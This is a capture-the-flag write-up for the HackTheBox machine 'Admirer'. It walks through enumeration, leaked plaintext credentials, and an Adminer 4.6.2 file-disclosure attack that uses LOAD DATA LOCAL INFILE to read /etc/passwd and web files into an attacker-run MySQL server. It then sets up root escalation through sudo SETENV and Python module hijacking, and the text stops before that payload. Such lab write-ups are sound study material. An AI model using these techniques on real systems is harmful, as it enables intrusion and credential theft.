Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC admirer.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-08 21:36 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> admirer.htb (10.10.10.187)</span><br><span class="line">Host is up (0.092s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry</span><br><span class="line">|_/admin-dir</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Admirer</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>We have a classical web app running on port 80, the FTP port 21 and the SSH port 22 open.</p><p>Opening <a href="http://admirer.htb/">http://admirer.htb</a> display a following page:</p><p><img src="https://user-images.githubusercontent.com/9076747/81843064-5c31a800-954d-11ea-81b2-2ef495a2ba59.png" alt="admirer homepage"></p><p>We don’t have a lot of informations on the homepage, however <code>nmap</code> returned a interesting entry from <code>robots.txt</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry</span><br><span class="line">|_/admin-dir</span><br></pre></td></tr></table></figure><p>Heading to <code>http://admirer.htb/admin-dir</code> return a <code>403 Forbidden</code> so let’s try to use <code>gobuster</code> with common file extension to find interesting files:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://admirer.htb/admin-dir/&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x php,txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/contacts.txt (Status: 200)</span><br><span class="line">/credentials.txt (Status: 200)</span><br></pre></td></tr></table></figure><p>We get two interesting text files.</p><h3 id="Credentials-txt"><a href="#Credentials-txt" class="headerlink" title="Credentials.txt"></a>Credentials.txt</h3><p> <code>credentials.txt</code> looks particularly promising. Let’s see what we have inside:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://admirer.htb/admin-dir/credentials.txt</span><br><span class="line">[Internal mail account]</span><br><span class="line">w.cooper@admirer.htb</span><br><span class="line">fgJr6q<span class="comment">#S\W:$P</span></span><br><span class="line"></span><br><span class="line">[FTP account]</span><br><span class="line">ftpuser</span><br><span class="line">%n?4Wz&#125;R<span class="variable">$tTF7</span></span><br><span class="line"></span><br><span class="line">[Wordpress account]</span><br><span class="line">admin</span><br><span class="line">w0rdpr3ss01!</span><br></pre></td></tr></table></figure><p>Well that’s surprisingly a lot of credentials… Let’s start with the beginning, we have seen FTP server open on <code>nmap</code>, let’s try to login using the credentials we just found: <code>ftpuser</code>:<code>%n?4Wz&#125;R$tTF7</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ftp admirer.htb</span><br><span class="line">Connected to admirer.htb.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (admirer.htb:hg8): ftpuser</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0            3405 Dec 02 21:24 dump.sql</span><br><span class="line">-rw-r--r--    1 0        0         5270987 Dec 03 21:20 html.tar.gz</span><br></pre></td></tr></table></figure><p>The FTP server looks looks like a backup folder, since we can see it contains a SQL database dump (<code>dump.sql</code>) and an archive of what seems to be the website source code (in <code>html.tar.gz</code>).</p><p>Let’s download both files to investigate:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; get dump.sql</span><br><span class="line">ftp&gt; get html.tar.gz</span><br><span class="line">ftp&gt; quit</span><br></pre></td></tr></table></figure><h3 id="Admirer-app-backup"><a href="#Admirer-app-backup" class="headerlink" title="Admirer app backup"></a>Admirer app backup</h3><p>The <code>dump.sql</code> doesn’t contains any useful informations so let’s directly skip to the <code>html.tar.gz</code> archive:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ tar -xf html.tar.gz</span><br><span class="line">[hg8@archbook ~]$ ls -l</span><br><span class="line">total 7188</span><br><span class="line">drwxr-x--- 6 hg8 hg8    4096 Jun  6  2019 assets</span><br><span class="line">drwxr-x--- 4 hg8 hg8    4096 Dec  2 21:29 images</span><br><span class="line">-rw-r----- 1 hg8 hg8    4613 Dec  3 21:20 index.php</span><br><span class="line">-rw-r----- 1 hg8 hg8     134 Dec  1 22:31 robots.txt</span><br><span class="line">drwxr-x--- 2 hg8 hg8    4096 May  9 13:41 utility-scripts</span><br><span class="line">drwxr-x--- 2 hg8 hg8    4096 Dec  2 18:25 w4ld0s_s3cr3t_d1r</span><br></pre></td></tr></table></figure><p><code>w4ld0s_s3cr3t_d1r</code> seems to be the previous name of the <code>/admin-dir</code> we found earlier. The <code>robots.txt</code> file extracted from the archive confirms the theory:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line"></span><br><span class="line"><span class="comment"># This folder contains personal stuff, so no one (not even robots!) should see it - waldo</span></span><br><span class="line">Disallow: /w4ld0s_s3cr3t_d1r</span><br></pre></td></tr></table></figure><p>Another folder catch the attention: <code>utility-scripts</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ls -l utility-scripts/</span><br><span class="line">total 16</span><br><span class="line">-rw-r----- 1 hg8 hg8 1795 Dec  2 18:48 admin_tasks.php</span><br><span class="line">-rw-r----- 1 hg8 hg8  401 Dec  1 23:28 db_admin.php</span><br><span class="line">-rw-r----- 1 hg8 hg8   20 Nov 29 20:32 info.php</span><br><span class="line">-rw-r----- 1 hg8 hg8   53 Dec  2 18:40 phptest.php</span><br></pre></td></tr></table></figure><p><code>db_admin.php</code> contains database credentials, let’s note them for later:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// utility-scripts/db_admin.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">  <span class="variable">$username</span> = <span class="string">&quot;waldo&quot;</span>;</span><br><span class="line">  <span class="variable">$password</span> = <span class="string">&quot;Wh3r3_1s_w4ld0?&quot;</span>;</span><br><span class="line">[...]</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Something odd is that the main <code>index.php</code> found in the archive contains different database credentials (<em>which should throw error since the password contains unescaped password</em>):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// index.php</span><br><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">  <span class="variable">$username</span> = <span class="string">&quot;waldo&quot;</span>;</span><br><span class="line">  <span class="variable">$password</span> = <span class="string">&quot;]F7jLHw:*G&gt;UPrTo&#125;~A&quot;</span>d6b<span class="string">&quot;;</span></span><br><span class="line"><span class="string">  <span class="variable">$dbname</span> = &quot;</span>admirerdb<span class="string">&quot;;</span></span><br><span class="line"><span class="string">[...]</span></span><br></pre></td></tr></table></figure><p>Out of curiosity I tried both of these password on <code>waldo</code> ssh account but none worked. </p><p>Let’s go back to our <code>utility-scripts</code> folder. <code>admin_tasks.php</code> contains an interesting app:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Web Interface to the admin_tasks script</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;task&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$task</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$task</span> == <span class="string">&#x27;1&#x27;</span> || <span class="variable">$task</span> == <span class="string">&#x27;2&#x27;</span> || <span class="variable">$task</span> == <span class="string">&#x27;3&#x27;</span> || <span class="variable">$task</span> == <span class="string">&#x27;4&#x27;</span> || <span class="variable">$task</span> == <span class="string">&#x27;5&#x27;</span> || <span class="variable">$task</span> == <span class="string">&#x27;6&#x27;</span> || <span class="variable">$task</span> == <span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/***********************************************************************************</span></span><br><span class="line"><span class="comment">        Available options:</span></span><br><span class="line"><span class="comment">        1) View system uptime</span></span><br><span class="line"><span class="comment">        2) View logged in users</span></span><br><span class="line"><span class="comment">        3) View crontab (current user only)</span></span><br><span class="line"><span class="comment">        4) Backup passwd file (not working)</span></span><br><span class="line"><span class="comment">        5) Backup shadow file (not working)</span></span><br><span class="line"><span class="comment">        6) Backup web data (not working)</span></span><br><span class="line"><span class="comment">        7) Backup database (not working)</span></span><br><span class="line"><span class="comment">        </span></span><br><span class="line"><span class="comment">        <span class="doctag">NOTE:</span> Options 4-7 are currently NOT working because they need root privileges.</span></span><br><span class="line"><span class="comment">        I&#x27;m leaving them in the valid tasks in case I figure out a way</span></span><br><span class="line"><span class="comment">        to securely run code as root from a PHP page.</span></span><br><span class="line"><span class="comment">        ************************************************************************************/</span></span><br><span class="line">        <span class="keyword">echo</span> str_replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&lt;br /&gt;&quot;</span>, shell_exec(<span class="string">&quot;/opt/scripts/admin_tasks.sh <span class="subst">$task</span> 2&gt;&amp;1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;Invalid task.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>If we could bypass this <code>if</code> condition we could achieve remote code execution… Unfortunately even if using weak comparaison (<code>==</code>) I couldn’t find a <a href="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf">Type Juggling</a> kind of exploit nor find any other way to bypass the check and achieve remote code execution from there. </p><p>Well since we don’t have other entry point so far let’s enumerate a bit more. We know that this archive is old since some folder were renamed and some files are not available anymore on the web server. Maybe new files have been added ? Let’s run <code>gobuster</code> to the only folder we didn’t check yet: <code>utility-scripts</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://admirer.htb/utility-scripts&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/adminer.php (Status: 200)</span><br><span class="line">/info.php (Status: 200)</span><br><span class="line">/phptest.php (Status: 200)</span><br></pre></td></tr></table></figure><p>We got a new one in reference to the box name: <code>adminer.php</code></p><h3 id="Adminer-Database-management-tool"><a href="#Adminer-Database-management-tool" class="headerlink" title="Adminer Database management tool."></a>Adminer Database management tool.</h3><blockquote><p>Adminer (formerly phpMinAdmin) is a full-featured database management tool written in PHP. Conversely to phpMyAdmin, it consist of a single file ready to deploy to the target server. Adminer is available for MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Firebird, SimpleDB, Elasticsearch and MongoDB.</p><p><a href="https://www.adminer.org/">https://www.adminer.org/</a></p></blockquote><p>Sounds good we have access to a database management tool. Unfortunately none of the credentials we founds seems to work:</p><p><img src="https://user-images.githubusercontent.com/9076747/81853902-678ccf80-955d-11ea-90d6-34783dac7b08.png" alt="admirer adminer homepage"></p><p>Yet we notice something useful on the page, the version used is <code>4.6.2</code> while the latest version is <code>4.7.7</code>. Searching about this version on Google returns an interesting result: </p><blockquote><p><strong>Adminer 4.6.2 File Disclosure Vulnerability</strong></p><p>Adminer is a popular PHP tool to administer MySQL and PostgreSQL databases. However, it can be lured to disclose arbitrary files. Attackers can abuse that to fetch passwords for popular apps such as Magento and Wordpress, and gain control of a site’s database.</p><p>Exploitation happens in three stages. First, the attacker needs a modified MySQL server, which is altered to send out data import requests to any client that connects.</p><p>Second, the attacker can instruct the victim Adminer to connect to his rigged MySQL server (external connections are actually a feature of Adminer).</p><p>Third – With access to the database the attacker could read sensitive information, such as customer details.</p><p><a href="https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability">https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability</a></p></blockquote><p>Sounds like a very interesting vulnerability, which actually goes back up to <a href="https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html">2018 in a little different scenario</a>.</p><p>Let’s give it a try.</p><h3 id="MySQL-Local-file-read-gt-waldo"><a href="#MySQL-Local-file-read-gt-waldo" class="headerlink" title="MySQL Local file read -&gt; waldo"></a>MySQL Local file read -&gt; waldo</h3><p>Following the vulnerability writeup we need to first set our own MySQL instance. We have to make sure it allows external connections with something like:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> PRIVILEGES <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;hg8&#x27;</span>@<span class="string">&#x27;10.10.10.187&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;&lt;password&gt;&#x27;</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> OPTION;</span><br></pre></td></tr></table></figure><p>Then create a table that will hold our extracted data:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `test` (</span><br><span class="line">  `txt` <span class="type">varchar</span>(<span class="number">800</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>latin1;</span><br></pre></td></tr></table></figure><p>Once our MySQL is all set and running let’s connect to it using <code>http://admirer.htb/utility-scripts/adminer.php</code>:</p><p><img src="https://user-images.githubusercontent.com/9076747/81856836-a3299880-9561-11ea-8f63-c772d16105a8.png" alt="admirer adminer MySQL connect"></p><p>Alright we are in and we can execute SQL queries. Let’s see if we can abuse the SQL query <code>LOAD DATA LOCAL INFILE</code> to retrieve servers data. Let’s start with the classical <code>/etc/passwd</code>:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LOAD DATA <span class="keyword">LOCAL</span> INFILE <span class="string">&#x27;/etc/passwd&#x27;</span> </span><br><span class="line"><span class="keyword">INTO</span> <span class="keyword">TABLE</span> test.test</span><br><span class="line">FIELDS TERMINATED <span class="keyword">BY</span> &quot;\n&quot;</span><br></pre></td></tr></table></figure><p>Unfortunately we get blocked by PHP restrictions:</p><blockquote><p>Error in query (2000): open_basedir restriction in effect. Unable to open file</p></blockquote><p>Then maybe we can try on files in the webroot directory ? Let’s check for the <code>index.php</code> since we know the file contains credentials, maybe we could find up-to-date passwords:</p><p><img src="https://user-images.githubusercontent.com/9076747/81856158-ae2ff900-9560-11ea-8721-88e45230f17e.png" alt="admirer adminer local file disclosure"></p><p><code>123 rows affected</code>, that looks good! We should now find the file content in the <code>test</code> table:</p><p><img src="https://user-images.githubusercontent.com/9076747/81856613-5940b280-9561-11ea-955e-c70ad2cb51fd.png" alt="admirer adminer local file disclosure"></p><p>Bingo! We got new credentials, let’s try them on <code>waldo</code> SSH account:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh waldo@admirer.htb</span><br><span class="line">waldo@admirer.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Sat May  9 14:13:42 2020 from 10.10.10.10</span></span><br><span class="line"><span class="string">waldo@admirer:~$ ls</span></span><br><span class="line"><span class="string">user.txt</span></span><br><span class="line"><span class="string">waldo@admirer:~$ cat user.txt</span></span><br><span class="line"><span class="string">dxxxxxxxxxxxxxxxxxxxx6</span></span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>During the usual recon, an interesting <code>sudo</code> config catch the eye:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">waldo@admirer:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> waldo:</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> waldo on admirer:</span><br><span class="line">User waldo may run the following commands on admirer:</span><br><span class="line">    (ALL) SETENV: /opt/scripts/admin_tasks.sh</span><br><span class="line">waldo@admirer:~$</span><br></pre></td></tr></table></figure><p>Looks like an homemade administration script. If we can find a vulnerability there it’s our way to root.</p><p>Let’s take a look at this script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">waldo@admirer:~$ cat /opt/scripts/admin_tasks.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">view_uptime</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/uptime -p</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">view_users</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/w</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">view_crontab</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/crontab -l</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">backup_passwd</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Backing up /etc/passwd to /var/backups/passwd.bak...&quot;</span></span><br><span class="line">        /bin/cp /etc/passwd /var/backups/passwd.bak</span><br><span class="line">        /bin/chown root:root /var/backups/passwd.bak</span><br><span class="line">        /bin/chmod 600 /var/backups/passwd.bak</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Done.&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">backup_shadow</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Backing up /etc/shadow to /var/backups/shadow.bak...&quot;</span></span><br><span class="line">        /bin/cp /etc/shadow /var/backups/shadow.bak</span><br><span class="line">        /bin/chown root:shadow /var/backups/shadow.bak</span><br><span class="line">        /bin/chmod 600 /var/backups/shadow.bak</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Done.&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">backup_web</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Running backup script in the background, it might take a while...&quot;</span></span><br><span class="line">        /opt/scripts/backup.py &amp;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">backup_db</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Running mysqldump in the background, it may take a while...&quot;</span></span><br><span class="line">        <span class="comment">#/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp;</span></span><br><span class="line">        /usr/bin/mysqldump -u root admirerdb &gt; /var/backups/dump.sql &amp;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>If you noticed, the <code>sudo</code> configuration informs us that environnement variable we set are kept when running <code>sudo /opt/scripts/admin_tasks.sh</code>, thanks to <code>SETENV</code>. At first when seeing this I was thinking we could modify our path to make the script run one of our script named <code>uptime</code> for example (like we did a few time in the past, on <a href="https://hg8.sh/posts/writeup/">Writeup box</a> for example).</p><p>Unfortunately the script author got careful about this and used only absolute path making it impossible for us to use this trick to elevate our privileges.</p><p>Digging a bit more we notice a call to a <code>backup.py</code> script. Let’s take a look:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> shutil <span class="keyword">import</span> make_archive</span><br><span class="line"></span><br><span class="line">src = <span class="string">&#x27;/var/www/html/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># old ftp directory, not used anymore</span></span><br><span class="line"><span class="comment">#dst = &#x27;/srv/ftp/html&#x27;</span></span><br><span class="line"></span><br><span class="line">dst = <span class="string">&#x27;/var/backups/html&#x27;</span></span><br><span class="line"></span><br><span class="line">make_archive(dst, <span class="string">&#x27;gztar&#x27;</span>, src)</span><br></pre></td></tr></table></figure><p>That’s interesting, what if we keep our idea of PATH hijaking and apply it to Python library <code>shutil</code>? </p><p>As far as I know when importing a library (<code>from shutil import make_archive</code>), Python looks in a defined folder to find the library files. Maybe it’s possible to ask Python to search for libraries in a folder we control and inject a rogue library ? Since <code>backup.py</code> is run as <code>root</code> we could achieve privilege escalation. </p><h3 id="Hijacking-Python-shutil-module"><a href="#Hijacking-Python-shutil-module" class="headerlink" title="Hijacking Python shutil module"></a>Hijacking Python shutil module</h3><p>Looking through the <a href="https://docs.python.org/3/using/cmdline.html">Python Documentation</a> we quickly find what we are looking for:</p><blockquote><p>PYTHONPATH is an environment 